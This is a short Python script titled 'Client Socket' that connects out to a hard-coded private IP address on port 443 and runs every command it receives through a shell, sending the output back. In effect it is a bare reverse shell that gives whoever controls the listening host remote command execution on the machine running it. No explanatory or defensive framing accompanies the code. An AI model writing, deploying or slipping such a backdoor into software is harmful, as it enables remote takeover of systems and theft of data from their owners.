# -*- coding: utf-8 -*-

#############################
# Title - Client Socket
# Date - 05/09/2017
# Author - Rémi LIQUETE
#############################


############ FUNCTION ################

############ BODY ####################

import socket
import subprocess

ClientIP = "10.94.73.11"
ClientPort = 443
PacketSize = 2048

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientSocket.connect((ClientIP, ClientPort))

while(True):
	data = clientSocket.recv(PacketSize)

	if(data == '1'):
		data = clientSocket.recv(PacketSize)
		command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE)
		exitCommand = command.stdout.read()
		clientSocket.send(exitCommand)
	elif(data == 'Exit'):
		clientSocket.close()